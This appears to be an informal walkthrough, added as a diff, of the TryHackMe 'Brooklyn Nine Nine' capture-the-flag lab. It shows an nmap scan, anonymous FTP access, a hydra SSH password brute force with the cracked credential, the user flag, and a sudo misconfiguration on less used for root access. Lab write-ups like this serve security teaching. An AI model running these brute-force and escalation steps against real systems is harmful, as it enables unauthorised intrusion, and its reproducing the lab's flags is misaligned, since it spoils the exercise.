@@ -1,0 +1,96 @@
+So today we have another tryhackme challenge which is brooklynninenine which is listed as easy let's hackthe boot2root machine.
+
+
+Main IP :: 10.49.140.31
+
+Running all port scan with nmap
+
+Nmap scan report for ip-10-49-140-31.ap-south-1.compute.internal (10.49.140.31)
+Host is up (0.00019s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap scan report for ip-10-49-140-31.ap-south-1.compute.internal (10.49.140.31)
+Host is up, received reset ttl 64 (0.00021s latency).
+Scanned at 2026-05-28 04:02:46 UTC for 7s
+
+PORT   STATE SERVICE REASON         VERSION
+21/tcp open  ftp     syn-ack ttl 64 vsftpd 3.0.3
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.49.105.194
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
+22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQjh/Ae6uYU+t7FWTpPoux5Pjv9zvlOLEMlU36hmSn4vD2pYTeHDbzv7ww75UaUzPtsC8kM1EPbMQn1BUCvTNkIxQ34zmw5FatZWNR8/De/u/9fXzHh4MFg74S3K3uQzZaY7XBaDgmU6W0KEmLtKQPcueUomeYkqpL78o5+NjrGO3HwqAH2ED1Zadm5YFEvA0STasLrs7i+qn1G9o4ZHhWi8SJXlIJ6f6O1ea/VqyRJZG1KgbxQFU+zYlIddXpub93zdyMEpwaSIP2P7UTwYR26WI2cqF5r4PQfjAMGkG1mMsOi6v7xCrq/5RlF9ZVJ9nwq349ngG/KTkHtcOJnvXz
+|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBItJ0sW5hVmiYQ8U3mXta5DX2zOeGJ6WTop8FCSbN1UIeV/9jhAQIiVENAW41IfiBYNj8Bm+WcSDKLaE8PipqPI=
+|   256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP2hV8Nm+RfR/f2KZ0Ub/OcSrqfY1g4qwsz16zhXIpqk
+80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.29 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+we keep it up with the ftp as it has anonymous login allowed
+
+cat note_to_jake.txt 
+From Amy,
+
+Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
+
+and we get this from amy and another user is jake and jake's password is weak starting with port 80
+
+<!-- Have you ever heard of steganography? --> and we get this hint from the source page
+
+also but to get the file via steganography we need some passphrase also we have had some of the hints that jake password is really weak so we use hydra on ftp and ssh with jake as username 
+
+
+s# hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.49.140.31
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-28 04:10:41
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
+[DATA] attacking ssh://10.49.140.31:22/
+[22][ssh] host: 10.49.140.31   login: jake   password: 987654321
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 2 final worker threads did not complete until end.
+[ERROR] 2 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+
+$ cat user.txt 
+ee11cbb19052e40b07aac0ca060c23ee
+
+
+TIME FOR PRIVILEGE ESCALATION
+
+sudo -l
+Matching Defaults entries for jake on brookly_nine_nine:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jake may run the following commands on brookly_nine_nine:
+    (ALL) NOPASSWD: /usr/bin/less
+
+easy for this as we have know the issue
+
+so now we can easily read root.txt
+
